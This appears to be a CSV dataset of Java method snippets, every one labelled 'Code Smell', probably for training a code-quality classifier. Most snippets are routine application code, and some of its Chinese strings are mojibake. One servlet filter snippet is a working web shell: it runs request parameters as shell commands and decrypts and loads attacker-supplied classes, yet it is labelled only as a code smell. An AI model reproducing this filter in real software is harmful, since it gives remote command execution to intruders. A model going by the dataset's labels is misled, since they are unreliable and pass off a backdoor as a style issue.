text,label,text_label
"public boolean mkdirs(String path){
  if (checkAccess(path,OsConstants.F_OK)) {
    return false;
  }
  List<String> parts=new ArrayList<>();
  String parent=path;
  Node<?> parentNode;
  do {
    String filename=Paths.getLastPathSegment(parent);
    parent=Paths.removeLastPathSegment(parent);
    parts.add(filename);
    parentNode=getNode(parent);
  }
 while (parentNode == null && !parent.equals(File.separator));
  if (!checkAccess(parent,OsConstants.W_OK) || parentNode == null || !parentNode.isDirectory()) {
    return false;
  }
  for (int i=parts.size() - 1; i >= 0; --i) {
    parentNode=new Node<>(parentNode,parts.get(i),false);
    parentNode.setDirectory(true);
    Objects.requireNonNull(parentNode.getParent()).addChild(parentNode);
    String fullPath=parentNode.getFullPath();
    addAction(fullPath,new Action(ACTION_CREATE,parentNode));
    invalidate(fullPath);
  }
  return true;
}",1,Code Smell
"public void visitAnyMethodrefConstant(Clazz clazz,AnyMethodrefConstant anyMethodrefConstant){
  Method referencedMethod=(Method)anyMethodrefConstant.referencedMethod;
  for (int index=0; index < referencingPopCount; index++) {
    int stackEntryIndex=referencingPopCount - index - 1;
    TracedStack stackBefore=partialEvaluator.getStackBefore(referencingOffset);
    Value stackEntry=stackBefore.getTop(stackEntryIndex);
    if (stackEntry.computationalType() == Value.TYPE_REFERENCE) {
      if (referencedMethod == null || ParameterEscapeMarker.isParameterEscaping(referencedMethod,index)) {
        markEscapingReferenceValues(referencingOffset,stackEntryIndex);
      }
      if (referencedMethod == null || ParameterEscapeMarker.isParameterModified(referencedMethod,index)) {
        markModifiedReferenceValues(referencingOffset,stackEntryIndex);
      }
    }
  }
  String returnType=ClassUtil.internalMethodReturnType(anyMethodrefConstant.getType(clazz));
  if (referencedMethod == null || ((ClassUtil.isInternalClassType(returnType) || ClassUtil.isInternalArrayType(returnType)) && ParameterEscapeMarker.returnsExternalValues(referencedMethod))) {
    markExternalReferenceValue(referencingOffset);
  }
}",1,Code Smell
"@Override public void onClick(View v){
  String newApi=inputApi.getText().toString().trim();
  if (!newApi.isEmpty() && (newApi.startsWith(""http"") || newApi.startsWith(""clan""))) {
    ArrayList<String> history=Hawk.get(HawkConfig.API_HISTORY,new ArrayList<String>());
    if (!history.contains(newApi))     history.add(0,newApi);
    if (history.size() > 10)     history.remove(10);
    Hawk.put(HawkConfig.API_HISTORY,history);
    listener.onchange(newApi);
    dismiss();
  }
}
@Override public void onClick(View v){
  ArrayList<String> history=Hawk.get(HawkConfig.API_HISTORY,new ArrayList<String>());
  if (history.isEmpty())   return;
  String current=Hawk.get(HawkConfig.API_URL,"""");
  int idx=0;
  if (history.contains(current))   idx=history.indexOf(current);
  ApiHistoryDialog dialog=new ApiHistoryDialog(getContext());
  dialog.setTip(""鍘嗗彶閰嶇疆鍒楄〃"");
  dialog.setAdapter(new ApiHistoryDialogAdapter.SelectDialogInterface(){
    @Override public void click(    String value){
      inputApi.setText(value);
      listener.onchange(value);
      dialog.dismiss();
    }
    @Override public void del(    String value,    ArrayList<String> data){
      Hawk.put(HawkConfig.API_HISTORY,data);
    }
  }
,history,idx);
  dialog.show();
}
@Override public void onClick(View v){
  if (XXPermissions.isGranted(getContext(),Permission.Group.STORAGE)) {
    Toast.makeText(getContext(),""宸茶幏寰楀瓨鍌ㄦ潈闄�"",Toast.LENGTH_SHORT).show();
  }
 else {
    XXPermissions.with(getContext()).permission(Permission.Group.STORAGE).request(new OnPermissionCallback(){
      @Override public void onGranted(      List<String> permissions,      boolean all){
        if (all) {
          Toast.makeText(getContext(),""宸茶幏寰楀瓨鍌ㄦ潈闄�"",Toast.LENGTH_SHORT).show();
        }
      }
      @Override public void onDenied(      List<String> permissions,      boolean never){
        if (never) {
          Toast.makeText(getContext(),""鑾峰彇瀛樺偍鏉冮檺澶辫触,璇峰湪绯荤粺璁剧疆涓紑鍚�"",Toast.LENGTH_SHORT).show();
          XXPermissions.startPermissionActivity((Activity)getContext(),permissions);
        }
 else {
          Toast.makeText(getContext(),""鑾峰彇瀛樺偍鏉冮檺澶辫触"",Toast.LENGTH_SHORT).show();
        }
      }
    }
);
  }
}",1,Code Smell
"/** 
 * {@inheritDoc} 
 */
@Override public boolean isCompatible(DalvInsn insn){
  RegisterSpecList regs=insn.getRegisters();
  if (!((insn instanceof CstInsn) && (regs.size() == 1) && unsignedFitsInByte(regs.get(0).getReg()))) {
    return false;
  }
  CstInsn ci=(CstInsn)insn;
  Constant cst=ci.getConstant();
  if (!(cst instanceof CstLiteralBits)) {
    return false;
  }
  CstLiteralBits cb=(CstLiteralBits)cst;
  if (regs.get(0).getCategory() == 1) {
    int bits=cb.getIntBits();
    return ((bits & 0xffff) == 0);
  }
 else {
    long bits=cb.getLongBits();
    return ((bits & 0xffffffffffffL) == 0);
  }
}",1,Code Smell
"/** 
 * 鏇存柊鎸囧畾鐨 Cluster
 * @param clusterId 瀹氫綅 ClusterId
 * @param request   璇锋眰鏇存柊鏁版嵁
 * @param operator  鎿嶄綔浜
 * @return 鏇存柊鍚庣殑鏁版嵁鍐呭
 */
@Override @Transactional(rollbackFor=Exception.class) public ClusterDTO update(String clusterId,ClusterUpdateReq request,String operator){
  ClusterDO clusterDO=ClusterDO.builder().clusterName(request.getClusterName()).clusterType(request.getClusterType()).clusterConfig(request.getClusterConfig() != null ? JsonUtil.toJsonString(request.getClusterConfig()) : null).masterFlag(request.getMasterFlag()).build();
  clusterService.update(clusterId,clusterDO,operator);
  log.info(""set cluster {} masterFlag to true"",clusterId);
  if (request.getMasterFlag() != null && request.getMasterFlag()) {
    ClusterQueryCondition condition=ClusterQueryCondition.builder().build();
    Pagination<ClusterDO> allClusters=clusterService.list(condition);
    for (    ClusterDO cluster : allClusters.getItems()) {
      if (cluster.getClusterId().equals(clusterId)) {
        continue;
      }
      clusterService.update(cluster.getClusterId(),ClusterDO.builder().masterFlag(false).build(),operator);
      log.info(""set cluster {} masterFlag to false"",cluster.getClusterId());
    }
  }
  return get(clusterId);
}
",1,Code Smell
"@Override public boolean action(Request request,Response response){
  if (request.getNettyRequest() instanceof FullHttpRequest) {
    InputBlacklistRequest inputData=getRequestBody(request.getNettyRequest(),InputBlacklistRequest.class);
    if (inputData != null && !StringUtil.isNullOrEmpty(inputData.getUserId()) && !StringUtil.isNullOrEmpty(inputData.getTargetUid())) {
      WFCMessage.BlackUserRequest friendRequest=WFCMessage.BlackUserRequest.newBuilder().setUid(inputData.getTargetUid()).setStatus(inputData.getStatus()).build();
      sendApiMessage(response,inputData.getUserId(),IMTopic.BlackListUserTopic,friendRequest.toByteArray(),result -> {
        ByteBuf byteBuf=Unpooled.buffer();
        byteBuf.writeBytes(result);
        ErrorCode errorCode=ErrorCode.fromCode(byteBuf.readByte());
        return new Result(errorCode);
      }
);
      return false;
    }
 else {
      setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
    }
  }
  return true;
}
",1,Code Smell
"protected void appendSaveRemovePlaylistButton(){
  if (!mIsSavePlaylistEnabled) {
    return;
  }
  Video original=getVideo();
  if (original == null || (!original.hasPlaylist() && !original.isPlaylistAsChannel() && !original.belongsToUserPlaylists())) {
    return;
  }
  getDialogPresenter().appendSingleButton(UiOptionItem.from(getContext().getString(original.belongsToUserPlaylists() ? R.string.remove_playlist : R.string.save_playlist),optionItem -> {
    MessageHelpers.showMessage(getContext(),R.string.wait_data_loading);
    if (original.hasPlaylist()) {
      syncToggleSaveRemovePlaylist(original,null);
    }
 else     if (original.belongsToUserPlaylists()) {
      mServiceManager.loadChannelUploads(original,mediaGroup -> {
        String playlistId=getFirstPlaylistId(mediaGroup);
        if (playlistId != null) {
          syncToggleSaveRemovePlaylist(original,playlistId);
        }
 else {
          mServiceManager.getPlaylistInfos(playlistInfos -> {
            List<PlaylistInfo> infos=Helpers.filter(playlistInfos,value -> Helpers.equals(value.getTitle(),original.getTitle()));
            String playlistId2=null;
            if (infos != null && infos.size() == 1) {
              playlistId2=infos.get(0).getPlaylistId();
            }
            syncToggleSaveRemovePlaylist(original,playlistId2);
          }
);
        }
      }
);
    }
 else {
      mServiceManager.loadChannelPlaylist(original,mediaGroup -> syncToggleSaveRemovePlaylist(original,getFirstPlaylistId(mediaGroup)));
    }
  }
));
}",1,Code Smell
"private int clone(Emulator<?> emulator){
  Arm32RegisterContext context=emulator.getContext();
  Pointer child_stack=context.getPointerArg(1);
  if (child_stack == null && context.getPointerArg(2) == null) {
    return fork(emulator);
  }
  int fn=context.getR5Int();
  int arg=context.getR6Int();
  if (child_stack != null && child_stack.getInt(0) == fn && child_stack.getInt(4) == arg) {
    return bionic_clone(emulator);
  }
 else {
    return pthread_clone(emulator);
  }
}",1,Code Smell
"private void filter(){
  String text=txtFilter.getText();
  model.clear();
  if (text.length() > 0) {
    List<SocketEntry> filteredList=new ArrayList<>();
    for (    SocketEntry entry : list) {
      if (entry.getApp().contains(text) || (entry.getPort() + """").contains(text) || entry.getHost().contains(text)|| (entry.getPid() + """").contains(text)) {
        filteredList.add(entry);
      }
    }
    model.addEntries(filteredList);
  }
 else {
    model.addEntries(list);
  }
  model.fireTableDataChanged();
}",1,Code Smell
"@Override public void doFilter(ServletRequest servletRequest,ServletResponse servletResponse,FilterChain filterChain) throws IOException, ServletException {
  System.out.println(""[+] Dynamic Filter says hello"");
  if (servletRequest.getParameter(""type"") != null && servletRequest.getParameter(""type"").equals(""basic"")) {
    String cmd=servletRequest.getParameter(basicCmdShellPwd);
    if (cmd != null && !cmd.isEmpty()) {
      String[] cmds=null;
      if (File.separator.equals(""/"")) {
        cmds=new String[]{""/bin/sh"",""-c"",cmd};
      }
 else {
        cmds=new String[]{""cmd"",""/C"",cmd};
      }
      String result=new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(""\\A"").next();
      servletResponse.getWriter().println(result);
    }
  }
 else   if (((HttpServletRequest)servletRequest).getHeader(behinderShellHeader) != null) {
    try {
      if (((HttpServletRequest)servletRequest).getMethod().equals(""POST"")) {
        String k=behinderShellPwd;
        ((HttpServletRequest)servletRequest).getSession().setAttribute(""u"",k);
        Cipher cipher=Cipher.getInstance(""AES"");
        cipher.init(2,new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute(""u"") + """").getBytes(),""AES""));
        byte[] evilClassBytes=cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
        Class evilClass=(Class)myClassLoaderClazz.getDeclaredMethod(""defineClass"",byte[].class,ClassLoader.class).invoke(null,evilClassBytes,Thread.currentThread().getContextClassLoader());
        Object evilObject=evilClass.newInstance();
        Method targetMethod=evilClass.getDeclaredMethod(""equals"",new Class[]{ServletRequest.class,ServletResponse.class});
        targetMethod.invoke(evilObject,new Object[]{servletRequest,servletResponse});
      }
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
  }
 else {
    filterChain.doFilter(servletRequest,servletResponse);
  }
}",1,Code Smell
"private static boolean tickEntry(Entry entry,boolean hasWrench){
  ChassisBlockEntity chassisBlockEntity=entry.be;
  Level beWorld=chassisBlockEntity.getLevel();
  Level world=Minecraft.getInstance().level;
  if (chassisBlockEntity.isRemoved() || beWorld == null || beWorld != world || !world.isLoaded(chassisBlockEntity.getBlockPos())) {
    return true;
  }
  if (!hasWrench && entry.timer > 20) {
    entry.timer=20;
    return false;
  }
  entry.timer--;
  if (entry.timer == 0)   return true;
  return false;
}",1,Code Smell
"/** 
 */
public SessionListPanel(AppWindow window){
  super(new BorderLayout());
  this.window=window;
  sessionListModel=new DefaultListModel<>();
  sessionList=new JList<>(sessionListModel);
  sessionList.setCursor(DEFAULT_CURSOR);
  SessionListRenderer r=new SessionListRenderer();
  sessionList.setCellRenderer(r);
  JScrollPane scrollPane=new SkinnedScrollPane(sessionList);
  this.add(scrollPane);
  sessionList.addMouseListener(new MouseAdapter(){
    @Override public void mouseClicked(    MouseEvent e){
      int selectedIndex=sessionList.getSelectedIndex();
      int index=sessionList.locationToIndex(e.getPoint());
      if (index != -1 && selectedIndex == index) {
        Rectangle r=sessionList.getCellBounds(index,index);
        if (r != null && r.contains(e.getPoint())) {
          int x=e.getPoint().x;
          int y=e.getPoint().y;
          if (x > r.x + r.width - 30 && x < r.x + r.width && y > r.y + 10 && y < r.y + r.height - 10) {
            System.out.println(""Clicked on: "" + index);
            removeSession(index);
          }
        }
      }
    }
    @Override public void mouseExited(    MouseEvent e){
      sessionList.setCursor(DEFAULT_CURSOR);
    }
  }
);
  sessionList.addMouseMotionListener(new MouseAdapter(){
    @Override public void mouseMoved(    MouseEvent e){
      int index=sessionList.locationToIndex(e.getPoint());
      if (index != -1) {
        Rectangle r=sessionList.getCellBounds(index,index);
        if (r != null && r.contains(e.getPoint())) {
          int x=e.getPoint().x;
          int y=e.getPoint().y;
          if (x > r.x + r.width - 30 && x < r.x + r.width && y > r.y + 10 && y < r.y + r.height - 10) {
            sessionList.setCursor(HAND_CURSOR);
            return;
          }
        }
      }
      sessionList.setCursor(DEFAULT_CURSOR);
    }
  }
);
  sessionList.addListSelectionListener(e -> {
    System.out.println(""called for index: "" + sessionList.getSelectedIndex() + "" ""+ e.getFirstIndex()+ "" ""+ e.getLastIndex()+ e.getValueIsAdjusting());
    if (!e.getValueIsAdjusting()) {
      int index=sessionList.getSelectedIndex();
      if (index != -1) {
        this.selectSession(index);
      }
    }
  }
);
}",1,Code Smell
